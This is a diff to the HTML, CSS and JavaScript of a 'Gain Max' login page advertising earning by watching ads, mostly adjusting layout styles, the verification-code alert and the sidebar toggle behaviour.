@@ -5,10 +5,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Gain Max - Login</title>
-     <meta property="og:title" content="SaudiBilnadin">
-    <meta property="og:description" content="Watch.Earn.Repeat">
-    <meta property="og:image" content="https://minii11.github.io/www.GainMax.com/image aa.jpg"> <!-- Update with the correct URL -->
-    <meta property="og:url" content="https://minii11.github.io/www.GainMax.com/">
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -23,8 +19,8 @@
             color: white;
             display: flex;
             align-items: center;
-            justify-content: space-between; /* Changed to space-between for proper alignment */
-            padding: 10px 20px;
+            justify-content: space-between; /* Adjusted for better layout */
+            padding: 10px 20px; /* Reduced padding */
             position: relative;
             z-index: 1001;
         }
@@ -38,16 +34,17 @@
             font-size: 24px;
             font-weight: bold;
             text-align: center;
+            flex-grow: 1; /* Ensures the name takes available space */
+            margin: 0; /* Removed margin for proper centering */
             text-shadow: 0 0 10px white, 0 0 20px white;
             animation: glow 1.5s infinite alternate;
-            flex-grow: 1; /* Ensures the name takes available space */
-            margin: 0; /* Removed margin to improve centering */
         }
 
         @keyframes glow {
             0% {
                 text-shadow: 0 0 10px white, 0 0 20px white;
             }
+
             100% {
                 text-shadow: 0 0 20px white, 0 0 30px white;
             }
@@ -99,6 +96,7 @@
             100% {
                 color: white;
             }
+
             50% {
                 color: yellow;
             }
@@ -147,6 +145,7 @@
             width: 100%;
             height: auto;
             border-radius: 0; /* Rectangular corners */
+            margin-top: 10px; /* Margin for spacing */
         }
 
         @media (max-width: 600px) {
@@ -158,7 +157,7 @@
             }
 
             .company-name {
-                font-size: 20px;
+                font-size: 20px; /* Adjusted font size for mobile */
                 margin: 0; /* Ensure no margin for proper centering */
             }
 
@@ -175,13 +174,15 @@
                 max-width: 90%; /* Ensuring form fits mobile */
             }
 
-            .content-image {
-                margin-top: 10px; /* Adjusting image margin */
-            }
-
             .reveal-message {
                 font-size: 16px; /* Adjusting font size for better readability */
             }
+        }
+
+        .content-section {
+            margin: 20px auto; /* Adjusting for mobile display */
+            max-width: 600px; /* Limit width for better readability */
+            padding: 10px; /* Padding for content section */
         }
     </style>
 </head>
@@ -211,7 +212,7 @@
     </div>
 </div>
 
-<section style="position: relative; text-align: center; margin-bottom: 20px;">
+<section class="content-section" style="position: relative; text-align: center;">
     <img src="image main.jpg" alt="Your Image" class="content-image">
 
     <a href="#login" onclick="showMessage(); return false;"
@@ -262,17 +263,31 @@
         if (passwordField.placeholder === "Enter VO Code") {
             event.preventDefault();
 
-            alert('You will be notified about your account verification and the ads will get unlocked typically in 2 hours!');
-            passwordField.value = '';
+            alert('You will be notified about further proceedings.');
+            document.getElementById('finalProceedingMessage').style.display = 'block';
+            passwordField.placeholder = "Password"; // Reset to original
+            passwordField.type = 'password'; // Reset to password type
         }
     });
 
     function toggleSidebar(event) {
         const sidebar = document.getElementById('sidebar');
-        sidebar.classList.toggle('active');
-        event.stopPropagation();
+        if (sidebar.classList.contains('active')) {
+            sidebar.classList.remove('active');
+        } else {
+            sidebar.classList.add('active');
+        }
     }
 
+    document.addEventListener('click', function (event) {
+        const sidebar = document.getElementById('sidebar');
+        const sidebarButton = document.querySelector('.sidebar-button');
+        if (!sidebar.contains(event.target) && !sidebarButton.contains(event.target)) {
+            sidebar.classList.remove('active');
+        }
+    });
+
+    // Close the sidebar when clicking outside of it
     document.addEventListener('click', function () {
         const sidebar = document.getElementById('sidebar');
         if (sidebar.classList.contains('active')) {
